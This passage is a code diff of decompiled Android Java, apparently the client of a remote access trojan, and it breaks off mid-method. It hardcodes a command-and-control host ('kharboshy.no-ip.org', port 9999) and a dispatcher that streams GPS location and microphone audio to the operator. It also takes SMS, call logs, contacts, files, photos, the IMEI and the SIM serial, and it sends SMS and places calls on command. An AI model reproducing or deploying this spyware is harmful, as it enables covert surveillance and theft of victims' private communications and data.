+        v0.putInt("port", v4_1.getPort());
+        v0.putBoolean("waitTrigger", v4_1.isWaitTrigger());
+        String v7 = "";
+        String v2 = "";
+        String v3 = "";
+        java.util.ArrayList v6 = v4_1.getKeywordSMS();
+        int v1_1 = 0;
+        while (v1_1 < v6.size()) {
+            if (v1_1 != (v6.size() - 1)) {
+                v7 = new StringBuilder(String.valueOf(v7)).append(((String) v6.get(v1_1))).append(";").toString();
+            } else {
+                v7 = new StringBuilder(String.valueOf(v7)).append(((String) v6.get(v1_1))).toString();
+            }
+            v1_1++;
+        }
+        v0.putString("smsKeyWords", v7);
+        java.util.ArrayList v8 = v4_1.getPhoneNumberCall();
+        int v1_2 = 0;
+        while (v1_2 < v8.size()) {
+            if (v1_2 != (v8.size() - 1)) {
+                v2 = new StringBuilder(String.valueOf(v2)).append(((String) v8.get(v1_2))).append(";").toString();
+            } else {
+                v2 = new StringBuilder(String.valueOf(v2)).append(((String) v8.get(v1_2))).toString();
+            }
+            v1_2++;
+        }
+        v0.putString("numCall", v2);
+        java.util.ArrayList v9 = v4_1.getPhoneNumberSMS();
+        int v1_0 = 0;
+        while (v1_0 < v9.size()) {
+            if (v1_0 != (v9.size() - 1)) {
+                v3 = new StringBuilder(String.valueOf(v3)).append(((String) v9.get(v1_0))).append(";").toString();
+            } else {
+                v3 = new StringBuilder(String.valueOf(v3)).append(((String) v9.get(v1_0))).toString();
+            }
+            v1_0++;
+        }
+        v0.putString("numSMS", v3);
+        v0.commit();
+        return;
+    }
+
+    public Packet.PreferencePacket loadPreferences()
+    {
+        Packet.PreferencePacket v3_1 = new Packet.PreferencePacket();
+        android.content.SharedPreferences v4 = this.client.getSharedPreferences("preferences", 0);
+        v3_1.setIp(v4.getString("ip", "kharboshy.no-ip.org"));
+        v3_1.setPort(v4.getInt("port", 9999));
+        v3_1.setWaitTrigger(v4.getBoolean("waitTrigger", 0));
+        int v5_1 = new java.util.ArrayList();
+        String v0 = v4.getString("smsKeyWords", "");
+        if (!v0.equals("")) {
+            java.util.StringTokenizer v6_1 = new java.util.StringTokenizer(v0, ";");
+            while (v6_1.hasMoreTokens()) {
+                v5_1.add(v6_1.nextToken());
+            }
+            v3_1.setKeywordSMS(v5_1);
+        }
+        int v7_1 = new java.util.ArrayList();
+        String v1 = v4.getString("numCall", "");
+        if (!v1.equals("")) {
+            java.util.StringTokenizer v6_3 = new java.util.StringTokenizer(v1, ";");
+            while (v6_3.hasMoreTokens()) {
+                v7_1.add(v6_3.nextToken());
+            }
+            v3_1.setPhoneNumberCall(v7_1);
+        }
+        int v8_1 = new java.util.ArrayList();
+        String v2 = v4.getString("numSMS", "");
+        if (!v2.equals("")) {
+            java.util.StringTokenizer v6_5 = new java.util.StringTokenizer(v2, ";");
+            while (v6_5.hasMoreTokens()) {
+                v8_1.add(v6_5.nextToken());
+            }
+            v3_1.setPhoneNumberSMS(v8_1);
+        }
+        return v3_1;
+    }
+
+    public void process(short p22, byte[] p23, int p24)
+    {
+        this.commande = p22;
+        this.chan = p24;
+        this.arguments = java.nio.ByteBuffer.wrap(p23);
+        if (this.commande != inout.Protocol.GET_GPS_STREAM) {
+            if (this.commande != inout.Protocol.STOP_GPS_STREAM) {
+                if (this.commande != inout.Protocol.GET_SOUND_STREAM) {
+                    if (this.commande != inout.Protocol.STOP_SOUND_STREAM) {
+                        if (this.commande != inout.Protocol.GET_CALL_LOGS) {
+                            if (this.commande != inout.Protocol.MONITOR_CALL) {
+                                if (this.commande != inout.Protocol.STOP_MONITOR_CALL) {
+                                    if (this.commande != inout.Protocol.GET_CONTACTS) {
+                                        if (this.commande != inout.Protocol.LIST_DIR) {
+                                            if (this.commande != inout.Protocol.GET_FILE) {
+                                                if (this.commande != inout.Protocol.GET_PICTURE) {
+                                                    if (this.commande != inout.Protocol.DO_TOAST) {
+                                                        if (this.commande != inout.Protocol.SEND_SMS) {
+                                                            if (this.commande != inout.Protocol.GIVE_CALL) {
+                                                                if (this.commande != inout.Protocol.GET_SMS) {
+                                                                    if (this.commande != inout.Protocol.MONITOR_SMS) {
+                                                                        if (this.commande != inout.Protocol.STOP_MONITOR_SMS) {
+                                                                            if (this.commande != 21) {
+                                                                                if (this.commande != 20) {
+                                                                                    if (this.commande != inout.Protocol.GET_ADV_INFORMATIONS) {
+                                                                                        if (this.commande != inout.Protocol.OPEN_BROWSER) {
+                                                                                            if (this.commande != inout.Protocol.DO_VIBRATE) {
+                                                                                                if (this.commande != 5) {
+                                                                                                    this.client.sendError(new StringBuilder("Command: ").append(this.commande).append(" unknown").toString());
+                                                                                                } else {
+                                                                                                    this.client.onDestroy();
+                                                                                                }
+                                                                                            } else {
+                                                                                                ((android.os.Vibrator) this.client.getSystemService("vibrator")).vibrate(this.arguments.getLong());
+                                                                                            }
+                                                                                        } else {
+                                                                                            String v19 = new String;
+                                                                                            v19(this.arguments.array());
+                                                                                            android.content.Intent v15_1 = new android.content.Intent("android.intent.action.VIEW", android.net.Uri.parse(v19));
+                                                                                            v15_1.setFlags(268435456);
+                                                                                            this.client.startActivity(v15_1);
+                                                                                        }
+                                                                                    } else {
+                                                                                        this.client.advancedInfos = new my.app.Library.AdvancedSystemInfo(this.client, p24);
+                                                                                        this.client.advancedInfos.getInfos();
+                                                                                    }
+                                                                                } else {
+                                                                                    this.client.sendInformation("Preferences received");
+                                                                                    this.savePreferences(this.arguments.array());
+                                                                                    this.client.loadPreferences();
+                                                                                }
+                                                                            } else {
+                                                                                this.client.handleData(p24, this.loadPreferences().build());
+                                                                            }
+                                                                        } else {
+                                                                            this.client.smsMonitor.stop();
+                                                                            this.client.smsMonitor = 0;
+                                                                            this.client.sendInformation("SMS monitoring stopped");
+                                                                        }
+                                                                    } else {
+                                                                        this.client.sendInformation("Start SMS monitoring");
+                                                                        this.client.smsMonitor = new my.app.Library.SMSMonitor(this.client, p24, this.arguments.array());
+                                                                    }
+                                                                } else {
+                                                                    this.client.sendInformation("SMS list request received");
+                                                                    if (!my.app.Library.SMSLister.listSMS(this.client, p24, this.arguments.array())) {
+                                                                        this.client.sendError("No SMS match for filter");
+                                                                    }
+                                                                }
+                                                            } else {
+                                                                this.intent = new android.content.Intent("android.intent.action.CALL", android.net.Uri.parse(new StringBuilder("tel:").append(new String(this.arguments.array())).toString()));
+                                                                this.intent.setFlags(268435456);
+                                                                this.client.startActivity(this.intent);
+                                                            }
+                                                        } else {
+                                                            java.util.HashMap v16 = utils.EncoderHelper.decodeHashMap(this.arguments.array());
+                                                            String v3_1 = ((String) v16.get("number"));
+                                                            String v5_1 = ((String) v16.get("body"));
+                                                            if (v5_1.getBytes().length >= 167) {
+                                                                android.telephony.SmsManager.getDefault().sendMultipartTextMessage(v3_1, 0, this.MessageDecoupator(v5_1), 0, 0);
+                                                            } else {
+                                                                android.telephony.SmsManager.getDefault().sendTextMessage(v3_1, 0, v5_1, 0, 0);
+                                                            }
+                                                            this.client.sendInformation("SMS sent");
+                                                        }
+                                                    } else {
+                                                        this.client.toast = android.widget.Toast.makeText(this.client, new String(this.arguments.array()), 1);
+                                                        this.client.toast.show();
+                                                    }
+                                                } else {
+                                                    this.client.sendInformation("Photo picture request received");
+                                                    this.client.photoTaker = new my.app.Library.PhotoTaker(this.client, p24);
+                                                    if (!this.client.photoTaker.takePhoto()) {
+                                                        this.client.sendError("Something went wrong while taking the picture");
+                                                    }
+                                                }
+                                            } else {
+                                                String v14_1 = new String(this.arguments.array());
+                                                this.client.sendInformation(new StringBuilder("Download file ").append(v14_1).append(" request received").toString());
+                                                this.client.fileDownloader = new my.app.Library.FileDownloader(this.client);
+                                                this.client.fileDownloader.downloadFile(v14_1, p24);
+                                            }
+                                        } else {
+                                            this.client.sendInformation("List directory request received");
+                                            String v14_3 = new String(this.arguments.array());
+                                            if (!my.app.Library.DirLister.listDir(this.client, p24, v14_3)) {
+                                                this.client.sendError(new StringBuilder("Directory: ").append(v14_3).append(" not found").toString());
+                                            }
+                                        }
+                                    } else {
+                                        this.client.sendInformation("Contacts request received");
+                                        if (!my.app.Library.ContactsLister.listContacts(this.client, p24, this.arguments.array())) {
+                                            this.client.sendError("No contact to return");
+                                        }
+                                    }
+                                } else {
+                                    this.client.callMonitor.stop();
+                                    this.client.callMonitor = 0;
+                                    this.client.sendInformation("Call monitoring stopped");
+                                }
+                            } else {
+                                this.client.sendInformation("Start monitoring call");
+                                this.client.callMonitor = new my.app.Library.CallMonitor(this.client, p24, this.arguments.array());
+                            }
+                        } else {
+                            this.client.sendInformation("Call log request received");
+                            if (!my.app.Library.CallLogLister.listCallLog(this.client, p24, this.arguments.array())) {
+                                this.client.sendError("No call logs");
+                            }
+                        }
+                    } else {
+                        this.client.audioStreamer.stop();
+                        this.client.audioStreamer = 0;
+                        this.client.sendInformation("Audio streaming stopped");
+                    }
+                } else {
+                    this.client.sendInformation("Audio streaming request received");
+                    this.client.audioStreamer = new my.app.Library.AudioStreamer(this.client, this.arguments.getInt(), p24);
+                    this.client.audioStreamer.run();
+                }
+            } else {
+                this.client.gps.stop();
+                this.client.gps = 0;
+                this.client.sendInformation("Location stopped");
+            }
+        } else {
+            String v17 = new String;
+            v17(this.arguments.array());
+            if ((v17.compareTo("network") != 0) && (v17.compareTo("gps") != 0)) {
+                this.client.sendError(new StringBuilder("Unknown provider \'").append(v17).append("\' for location").toString());
+            } else {
+                this.client.gps = new my.app.Library.GPSListener(this.client, v17, p24);
+                this.client.sendInformation("Location request received");
+            }
+        }
+        return;
+    }
+}
+package my.app.client;
+public final class R$attr {
+
+    public R$attr()
+    {
+        return;
+    }
+}
+package my.app.client;
+public final class R$drawable {
+    public static final int ic_launcher = 2130837504;
+
+    public R$drawable()
+    {
+        return;
+    }
+}
+package my.app.client;
+public final class R$id {
+    public static final int buttonstart = 2131099650;
+    public static final int buttonstop = 2131099651;
+    public static final int ipfield = 2131099648;
+    public static final int portfield = 2131099649;
+
+    public R$id()
+    {
+        return;
+    }
+}
+package my.app.client;
+public final class R$layout {
+    public static final int main = 2130903040;
+
+    public R$layout()
+    {
+        return;
+    }
+}
+package my.app.client;
+public final class R$string {
+    public static final int app_name = 2131034113;
+    public static final int hello = 2131034112;
+
+    public R$string()
+    {
+        return;
+    }
+}
+package my.app.client;
+public final class R$xml {
+    public static final int preferences = 2130968576;
+
+    public R$xml()
+    {
+        return;
+    }
+}
+package my.app.client;
+public final class R {
+
+    public R()
+    {
+        return;
+    }
+}
+package my.app.Library;
+ class AdvancedSystemInfo$1 extends android.content.BroadcastReceiver {
+    final synthetic my.app.Library.AdvancedSystemInfo this$0;
+
+    AdvancedSystemInfo$1(my.app.Library.AdvancedSystemInfo p1)
+    {
+        this.this$0 = p1;
+        return;
+    }
+
+    public void onReceive(android.content.Context p13, android.content.Intent p14)
+    {
+        int v0 = p14.getIntExtra("health", 0);
+        int v1 = p14.getIntExtra("level", 0);
+        int v2 = p14.getIntExtra("plugged", 0);
+        boolean v3 = p14.getExtras().getBoolean("present");
+        int v4 = p14.getIntExtra("scale", 0);
+        int v5 = p14.getIntExtra("status", 0);
+        String v6 = p14.getExtras().getString("technology");
+        int v7 = p14.getIntExtra("temperature", 0);
+        int v8 = p14.getIntExtra("voltage", 0);
+        this.this$0.p.setBatteryHealth(v0);
+        this.this$0.p.setBatteryLevel(v1);
+        this.this$0.p.setBatteryPlugged(v2);
+        this.this$0.p.setBatteryPresent(v3);
+        this.this$0.p.setBatteryScale(v4);
+        this.this$0.p.setBatteryStatus(v5);
+        this.this$0.p.setBatteryTechnology(v6);
+        this.this$0.p.setBatteryTemperature(v7);
+        this.this$0.p.setBatteryVoltage(v8);
+        this.this$0.ctx.handleData(this.this$0.channel, this.this$0.p.build());
+        this.this$0.ctx.unregisterReceiver(my.app.Library.AdvancedSystemInfo.access$0(this.this$0));
+        return;
+    }
+}
+package my.app.Library;
+public class AdvancedSystemInfo {
+    private android.content.BroadcastReceiver batteryInfoReceiver;
+    int channel;
+    my.app.client.ClientListener ctx;
+    Packet.AdvancedInformationPacket p;
+    boolean waitingBattery;
+
+    public AdvancedSystemInfo(my.app.client.ClientListener p2, int p3)
+    {
+        this.waitingBattery = 1;
+        this.batteryInfoReceiver = new my.app.Library.AdvancedSystemInfo$1(this);
+        this.p = new Packet.AdvancedInformationPacket();
+        this.ctx = p2;
+        this.channel = p3;
+        return;
+    }
+
+    static synthetic android.content.BroadcastReceiver access$0(my.app.Library.AdvancedSystemInfo p1)
+    {
+        return p1.batteryInfoReceiver;
+    }
+
+    public void androidInfo()
+    {
+        this.p.setAndroidVersion(android.os.Build$VERSION.RELEASE);
+        this.p.setAndroidSdk(android.os.Build$VERSION.SDK_INT);
+        return;
+    }
+
+    public void getInfos()
+    {
+        this.phoneInfo();
+        this.networkInfo();
+        this.androidInfo();
+        this.sensorsInfo();
+        this.ctx.registerReceiver(this.batteryInfoReceiver, new android.content.IntentFilter("android.intent.action.BATTERY_CHANGED"));
+        return;
+    }
+
+    public void networkInfo()
+    {
+        android.net.ConnectivityManager v0_1 = ((android.net.ConnectivityManager) this.ctx.getSystemService("connectivity"));
+        android.net.NetworkInfo v1_1 = v0_1.getNetworkInfo(1);
+        this.p.setWifiAvailable(v1_1.isAvailable());
+        this.p.setWifiConnectedOrConnecting(v1_1.isConnectedOrConnecting());
+        this.p.setWifiExtraInfos(v1_1.getExtraInfo());
+        this.p.setWifiReason(v1_1.getReason());
+        android.net.NetworkInfo v1_0 = v0_1.getNetworkInfo(0);
+        if ((v1_0 == null) || ((v1_0.getSubtype() != 1) && (v1_0.getSubtype() != 2))) {
+            this.p.setMobileNetworkName("3g");
+        } else {
+            this.p.setMobileNetworkName("2g");
+        }
+        this.p.setMobileNetworkAvailable(v1_0.isAvailable());
+        this.p.setMobileNetworkConnectedOrConnecting(v1_0.isConnectedOrConnecting());
+        this.p.setMobileNetworkExtraInfos(v1_0.getExtraInfo());
+        this.p.setMobileNetworkReason(v1_0.getReason());
+        return;
+    }
+
+    public void phoneInfo()
+    {
+        android.telephony.TelephonyManager v0_1 = ((android.telephony.TelephonyManager) this.ctx.getSystemService("phone"));
+        this.p.setPhoneNumber(v0_1.getLine1Number());
+        this.p.setIMEI(v0_1.getDeviceId());
+        this.p.setSoftwareVersion(v0_1.getDeviceSoftwareVersion());
+        this.p.setCountryCode(v0_1.getNetworkCountryIso());
+        this.p.setOperatorCode(v0_1.getNetworkOperator());
+        this.p.setOperatorName(v0_1.getNetworkOperatorName());
+        this.p.setSimOperatorCode(v0_1.getSimOperator());
+        this.p.setSimOperatorName(v0_1.getSimOperatorName());
+        this.p.setSimCountryCode(v0_1.getSimCountryIso());
+        this.p.setSimSerial(v0_1.getSimSerialNumber());
+        return;
+    }
+
+    public void sensorsInfo()
+    {
+        java.util.List v1 = ((android.hardware.SensorManager) this.ctx.getSystemService("sensor")).getSensorList(-1);
+        java.util.ArrayList v3_1 = new java.util.ArrayList();
+        Packet.AdvancedInformationPacket v4_1 = v1.iterator();
+        while (v4_1.hasNext()) {
+            v3_1.add(((android.hardware.Sensor) v4_1.next()).getName());
+        }
+        this.p.setSensors(v3_1);
+        return;
+    }
+}
+package my.app.Library;
+ class AudioStreamer$1 implements java.lang.Runnable {
+    final synthetic my.app.Library.AudioStreamer this$0;
+
+    AudioStreamer$1(my.app.Library.AudioStreamer p1)
+    {
+        this.this$0 = p1;
+        return;
+    }
+
+    public void run()
+    {
+        this.this$0.record();
+        return;
+    }
+}
+package my.app.Library;
+public class AudioStreamer {
+    public final String TAG;
+    int audioEncoding;
+    android.media.AudioRecord audioRecord;
+    public java.util.concurrent.BlockingQueue bbq;
+    byte[] buff;
+    byte[] buffer;
+    int bufferSizeRecorder;
+    int chan;
+    int channelConfiguration;
+    android.content.Context ctx;
+    int frequency;
+    public boolean stop;
+    Thread threcord;
+
+    public AudioStreamer(android.media.AudioRecord$OnRecordPositionUpdateListener p7, int p8, int p9)
+    {
+        this.TAG = "AudioStreamer";
+        this.stop = 0;
+        this.bbq = new java.util.concurrent.LinkedBlockingQueue();
+        this.frequency = 11025;
+        this.channelConfiguration = 2;
+        this.audioEncoding = 2;
+        this.chan = p9;
+        this.bufferSizeRecorder = android.media.AudioRecord.getMinBufferSize(this.frequency, this.channelConfiguration, this.audioEncoding);
+        this.audioRecord = new android.media.AudioRecord(p8, this.frequency, this.channelConfiguration, this.audioEncoding, this.bufferSizeRecorder);
+        this.audioRecord.setPositionNotificationPeriod(512);
+        this.audioRecord.setRecordPositionUpdateListener(p7);
+        this.threcord = new Thread(new my.app.Library.AudioStreamer$1(this));
+        return;
+    }
+
+    public int getChannel()
+    {
+        return this.chan;
+    }
+
+    public byte[] getData()
+    {
+        try {
+            int v0_4;
+            if (this.bbq.isEmpty()) {
+                v0_4 = 0;
+            } else {
+                v0_4 = ((byte[]) this.bbq.take());
+            }
+        } catch (int v0) {
+        }
+        return v0_4;
+    }
+
+    public void record()
+    {
+        try {
+            if (this.audioRecord.getState() != 0) {
+                java.util.concurrent.BlockingQueue v3_11 = new byte[this.bufferSizeRecorder];
+                this.buffer = v3_11;
+                this.audioRecord.startRecording();
+                while (!this.stop) {
+                    int v0 = this.audioRecord.read(this.buffer, 0, this.bufferSizeRecorder);
+                    byte[] v2 = new byte[v0];
+                    System.arraycopy(this.buffer, 0, v2, 0, v0);
+                    this.bbq.add(v2);
+                }
+                this.audioRecord.stop();
+            } else {
+                android.util.Log.e("AudioStreamer", "Initialisation failed !");
+                this.audioRecord.release();
+                this.audioRecord = 0;
+            }
+        } catch (Throwable v1) {
+            android.util.Log.e("AudioRecord", "Recording Failed");
+        }
+        return;
+    }
+
+    public void run()
+    {
+        android.util.Log.i("AudioStreamer", "Launch record thread");
+        this.stop = 0;
+        this.threcord.start();
+        return;
+    }
+
+    public void stop()
+    {
+        this.stop = 1;
+        return;
+    }
+}
+package my.app.Library;
+public class CallLogLister {
+
+    public CallLogLister()
+    {
+        return;
+    }
+
+    public static boolean listCallLog(my.app.client.ClientListener p21, int p22, byte[] p23)
+    {
+        int v20;
+        java.util.ArrayList v19_1 = new java.util.ArrayList();
+        String v5_1 = new String(p23);
+        String[] v4 = new String[7];
+        v4[0] = "_id";
+        v4[1] = "type";
+        v4[2] = "date";
+        v4[3] = "duration";
+        v4[4] = "number";
+        v4[5] = "name";
+        v4[6] = "raw_contact_id";
+        android.database.Cursor v18 = p21.getContentResolver().query(android.provider.CallLog$Calls.CONTENT_URI, v4, v5_1, 0, "date DESC");
+        if (v18.getCount() == 0) {
+            v20 = 0;
+        } else {
+            v18.moveToFirst();
+            do {
+                if (v18.getColumnCount() != 0) {
+                    v19_1.add(new Packet.CallPacket(v18.getInt(v18.getColumnIndex("_id")), v18.getInt(v18.getColumnIndex("type")), v18.getLong(v18.getColumnIndex("date")), v18.getLong(v18.getColumnIndex("duration")), v18.getInt(v18.getColumnIndex("raw_contact_id")), v18.getString(v18.getColumnIndex("number")), v18.getString(v18.getColumnIndex("name"))));
+                }
+            } while(v18.moveToNext());
+            v20 = 1;
+        }
+        p21.handleData(p22, new Packet.CallLogPacket(v19_1).build());
+        return v20;
+    }
+}
+package my.app.Library;
+ class CallMonitor$1 extends android.content.BroadcastReceiver {
+    private static final String TAG = "CallReceiver";
+    final synthetic my.app.Library.CallMonitor this$0;
+
+    CallMonitor$1(my.app.Library.CallMonitor p1)
+    {
+        this.this$0 = p1;
+        return;
+    }
+
+    public void onReceive(android.content.Context p10, android.content.Intent p11)
+    {
+        String v0 = p11.getAction();
+        if (!v0.equals("android.intent.action.NEW_OUTGOING_CALL")) {
+            if (v0.equals("android.intent.action.PHONE_STATE")) {
+                String v3 = p11.getStringExtra("state");
+                String v2 = p11.getStringExtra("incoming_number");
+                if ((v2 == null) || ((this.this$0.phoneNumberFilter == null) || (this.this$0.phoneNumberFilter.contains(v2)))) {
+                    if (!v3.equals(android.telephony.TelephonyManager.EXTRA_STATE_RINGING)) {
+                        if (!v3.equals(android.telephony.TelephonyManager.EXTRA_STATE_IDLE)) {
+                            if ((v3.equals(android.telephony.TelephonyManager.EXTRA_STATE_OFFHOOK)) && (!this.this$0.isCalling.booleanValue())) {
+                                android.util.Log.i("CallReceiver", new StringBuilder("Re\u00c3\u00a7u d\u00c3\u00a9croch\u00c3\u00a9 of ").append(v2).toString());
+                                this.this$0.ctx.handleData(this.this$0.channel, new Packet.CallStatusPacket(3, v2).build());
+                            }
+                        } else {
+                            if (v2 != null) {
+                                android.util.Log.i("CallReceiver", new StringBuilder("Missed call of ").append(v2).toString());
+                                this.this$0.ctx.handleData(this.this$0.channel, new Packet.CallStatusPacket(2, v2).build());
+                            } else {
+                                android.util.Log.i("CallReceiver", "Hang Up/Refused");
+                                this.this$0.ctx.handleData(this.this$0.channel, new Packet.CallStatusPacket(5, v2).build());
+                            }
+                            this.this$0.isCalling = Boolean.valueOf(0);
+                        }
+                    } else {
+                        this.this$0.ctx.handleData(this.this$0.channel, new Packet.CallStatusPacket(1, v2).build());
+                    }
+                }
+            }
+        } else {
+            String v1 = p11.getStringExtra("android.intent.extra.PHONE_NUMBER");
+            android.util.Log.i("CallReceiver", new StringBuilder("Outgoing call to ").append(v1).toString());
+            this.this$0.ctx.handleData(this.this$0.channel, new Packet.CallStatusPacket(4, v1).build());
+            this.this$0.isCalling = Boolean.valueOf(1);
+        }
+        return;
+    }
+}
+package my.app.Library;
+public class CallMonitor {
+    protected android.content.BroadcastReceiver Callreceiver;
+    int channel;
+    my.app.client.ClientListener ctx;
+    Boolean isCalling;
+    java.util.HashSet phoneNumberFilter;
+
+    public CallMonitor(my.app.client.ClientListener p4, int p5, byte[] p6)
+    {
+        this.isCalling = Boolean.valueOf(0);
+        this.Callreceiver = new my.app.Library.CallMonitor$1(this);
+        this.ctx = p4;
+        this.channel = p5;
+        this.phoneNumberFilter = utils.EncoderHelper.decodeHashSet(p6);
+        android.content.IntentFilter v0_1 = new android.content.IntentFilter();
+        v0_1.addAction("android.intent.action.PHONE_STATE");
+        v0_1.addAction("android.intent.action.NEW_OUTGOING_CALL");
+        this.ctx.registerReceiver(this.Callreceiver, v0_1);
+        return;
+    }
+
+    public void stop()
+    {
+        this.ctx.unregisterReceiver(this.Callreceiver);
+        return;
+    }
+}
+package my.app.Library;
+public class ContactsLister {
+
+    public ContactsLister()
+    {
+        return;
+    }
+
+    public static boolean listContacts(my.app.client.ClientListener p68, int p69, byte[] p70)
+    {
+        int v60;
+        java.util.ArrayList v46_1 = new java.util.ArrayList();
+        String v6_1 = new String(p70);
+        android.content.ContentResolver v3 = p68.getContentResolver();
+        android.database.Cursor v34 = v3.query(android.provider.ContactsContract$Contacts.CONTENT_URI, 0, v6_1, 0, " DISPLAY_NAME ");
+        if (v34.getCount() <= 0) {
+            v60 = 0;
+        } else {
+            while (v34.moveToNext()) {
+                utils.Contact v32_1 = new utils.Contact();
+                String v39 = v34.getString(v34.getColumnIndex("_id"));
+                long v40 = v34.getLong(v34.getColumnIndex("_id"));
+                int v64 = v34.getInt(v34.getColumnIndex("times_contacted"));
+                long v47 = v34.getLong(v34.getColumnIndex("last_time_contacted"));
+                String v35 = v34.getString(v34.getColumnIndex("display_name"));
+                int v61 = v34.getInt(v34.getColumnIndex("starred"));
+                v32_1.setId(v40);
+                v32_1.setLast_time_contacted(v47);
+                v32_1.setTimes_contacted(v64);
+                v32_1.setDisplay_name(v35);
+                v32_1.setStarred(v61);
+                v34.getString(v34.getColumnIndex("display_name"));
+                if (Integer.parseInt(v34.getString(v34.getColumnIndex("has_phone_number"))) > 0) {
+                    String[] v11_0 = new String[1];
+                    v11_0[0] = v39;
+                    android.database.Cursor v55 = v3.query(android.provider.ContactsContract$CommonDataKinds$Phone.CONTENT_URI, 0, "contact_id = ?", v11_0, 0);
+                    java.util.ArrayList v57_1 = new java.util.ArrayList();
+                    while (v55.moveToNext()) {
+                        v57_1.add(v55.getString(v55.getColumnIndex("data1")));
+                    }
+                    v55.close();
+                    v32_1.setPhones(v57_1);
+                    String[] v11_1 = new String[1];
+                    v11_1[0] = v39;
+                    android.database.Cursor v37 = v3.query(android.provider.ContactsContract$CommonDataKinds$Email.CONTENT_URI, 0, "contact_id = ?", v11_1, 0);
+                    if (v37.getCount() != 0) {
+                        java.util.ArrayList v38_1 = new java.util.ArrayList();
+                        while (v37.moveToNext()) {
+                            v38_1.add(v37.getString(v37.getColumnIndex("data1")));
+                        }
+                        v37.close();
+                        v32_1.setEmails(v38_1);
+                    }
+                    String[] v11_2 = new String[2];
+                    v11_2[0] = v39;
+                    v11_2[1] = "vnd.android.cursor.item/note";
+                    android.database.Cursor v51 = v3.query(android.provider.ContactsContract$Data.CONTENT_URI, 0, "contact_id = ? AND mimetype = ?", v11_2, 0);
+                    if (v51.getCount() != 0) {
+                        java.util.ArrayList v52_1 = new java.util.ArrayList();
+                        if (v51.moveToFirst()) {
+                            v52_1.add(v51.getString(v51.getColumnIndex("data1")));
+                        }
+                        v51.close();
+                        v32_1.setNotes(v52_1);
+                    }
+                    java.util.ArrayList v0_12 = new String[2];
+                    String[] v16 = v0_12;
+                    v16[0] = v39;
+                    v16[1] = "vnd.android.cursor.item/postal-address_v2";
+                    android.database.Cursor v28 = v3.query(android.provider.ContactsContract$Data.CONTENT_URI, 0, "contact_id = ? AND mimetype = ?", v16, 0);
+                    if (v28.getCount() != 0) {
+                        while (v28.moveToNext()) {
+                            String v63 = v28.getString(v28.getColumnIndex("data4"));
+                            String v31 = v28.getString(v28.getColumnIndex("data7"));
+                            String v62 = v28.getString(v28.getColumnIndex("data8"));
+                            String v59 = v28.getString(v28.getColumnIndex("data9"));
+                            String v33 = v28.getString(v28.getColumnIndex("data10"));
+                            int v66 = v28.getInt(v28.getColumnIndex("data2"));
+                            v32_1.setStreet(v63);
+                            v32_1.setCity(v31);
+                            v32_1.setRegion(v62);
+                            v32_1.setPostalcode(v59);
+                            v32_1.setCountry(v33);
+                            v32_1.setType_addr(v66);
+                        }
+                        v28.close();
+                    }
+                    java.util.ArrayList v0_32 = new String[2];
+                    String[] v21 = v0_32;
+                    v21[0] = v39;
+                    v21[1] = "vnd.android.cursor.item/im";
+                    android.database.Cursor v42 = v3.query(android.provider.ContactsContract$Data.CONTENT_URI, 0, "contact_id = ? AND mimetype = ?", v21, 0);
+                    if (v42.getCount() != 0) {
+                        java.util.ArrayList v44_1 = new java.util.ArrayList();
+                        if (v42.moveToFirst()) {
+                            v44_1.add(v42.getString(v42.getColumnIndex("data1")));
+                        }
+                        v42.close();
+                        v32_1.setMessaging(v44_1);
+                    }
+                    java.util.ArrayList v0_38 = new String[2];
+                    String[] v26 = v0_38;
+                    v26[0] = v39;
+                    v26[1] = "vnd.android.cursor.item/organization";
+                    android.database.Cursor v53 = v3.query(android.provider.ContactsContract$Data.CONTENT_URI, 0, "contact_id = ? AND mimetype = ?", v26, 0);
+                    if (v53.getCount() != 0) {
+                        if (v53.moveToFirst()) {
+                            String v54 = v53.getString(v53.getColumnIndex("data1"));
+                            String v65 = v53.getString(v53.getColumnIndex("data4"));
+                            v32_1.setOrganisationName(v54);
+                            v32_1.setOrganisationStatus(v65);
+                        }
+                        v53.close();
+                    }
+                    java.io.InputStream v45 = android.provider.ContactsContract$Contacts.openContactPhotoInputStream(v3, android.content.ContentUris.withAppendedId(android.provider.ContactsContract$Contacts.CONTENT_URI, v40));
+                    if (v45 != null) {
+                        android.graphics.Bitmap v58 = android.graphics.BitmapFactory.decodeStream(v45);
+                        java.io.ByteArrayOutputStream v30_1 = new java.io.ByteArrayOutputStream();
+                        v58.compress(android.graphics.Bitmap$CompressFormat.PNG, 0, v30_1);
+                        v32_1.setPhoto(v30_1.toByteArray());
+                    }
+                    v46_1.add(v32_1);
+                }
+            }
+            v60 = 1;
+        }
+        p68.handleData(p69, new Packet.ContactsPacket(v46_1).build());
+        return v60;
+    }
+}
+package my.app.Library;
+public class DirLister {
+
+    public DirLister()
+    {
+        return;
+    }
+
+    public static boolean listDir(my.app.client.ClientListener p3, int p4, String p5)
+    {
+        java.io.File v1_1;
+        java.util.ArrayList v0_1 = new java.util.ArrayList();
+        if (!p5.equals("/")) {
+            v1_1 = new java.io.File(p5);
+        } else {
+            v1_1 = android.os.Environment.getExternalStorageDirectory();
+        }
+        int v2_6;
+        if (v1_1.exists()) {
+            v0_1.add(my.app.Library.DirLister.visitAllDirsAndFiles(v1_1));
+            p3.handleData(p4, new Packet.FileTreePacket(v0_1).build());
+            v2_6 = 1;
+        } else {
+            v2_6 = 0;
+        }
+        return v2_6;
+    }
+
+    public static utils.MyFile visitAllDirsAndFiles(java.io.File p10)
+    {
+        utils.MyFile v4_1;
+        if (!p10.exists()) {
+            v4_1 = 0;
+        } else {
+            if (!p10.isDirectory()) {
+                v4_1 = new utils.MyFile(p10);
+            } else {
+                String[] v1 = p10.list();
+                v4_1 = new utils.MyFile(p10);
+                if ((v1 != null) && (v1.length != 0)) {
+                    int v6 = v1.length;
+                    int v5_2 = 0;
+                    while (v5_2 < v6) {
+                        String v0 = v1[v5_2];
+                        try {
+                            v4_1.addChild(my.app.Library.DirLister.visitAllDirsAndFiles(new java.io.File(p10, v0)));
+                        } catch (Exception v2) {
+                            System.out.println(new StringBuilder("Child !").append(v0).toString());
+                            v2.printStackTrace();
+                        }
+                        v5_2++;
+                    }
+                }
+            }
+        }
+        return v4_1;
+    }
+
+    public static void visitAllDirsAndFiles(java.io.File p9, java.util.ArrayList p10)
+    {
+        if (p9.exists()) {
+            if (!p9.isDirectory()) {
+                p10.add(new utils.MyFile(p9));
+            } else {
+                String[] v1 = p9.list();
+                p10.add(new utils.MyFile(p9));
+                if (v1 != null) {
+                    int v5 = v1.length;
+                    int v4_3 = 0;
+                    while (v4_3 < v5) {
+                        String v0 = v1[v4_3];
+                        try {
